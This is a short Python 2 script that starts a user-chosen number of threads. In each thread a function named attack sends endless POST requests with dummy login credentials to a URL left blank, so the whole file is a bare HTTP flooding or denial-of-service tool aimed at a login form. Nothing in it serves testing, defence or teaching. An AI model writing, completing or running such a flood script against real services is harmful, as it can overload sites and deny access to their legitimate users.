import urllib
import urllib2 
from threading import Thread
import sys

'''
the number of threads
'''
num = int (sys.argv[1])

data = {
    'username': 'dummy',
    'password': 'dummy',
}

def attack():
	while True:
		req = urllib2.Request(url="",
		                      data=urllib.urlencode(data), 
		                      headers={"Content-type": "application/x-www-form-urlencoded"}) 
		response = urllib2.urlopen(req)
		the_page = response.read()
		print the_page

if __name__ == "__main__":
    for k in range(0, num):
        thread = Thread(target = attack)
        thread.start()
        print 'Launched thread '+str(k)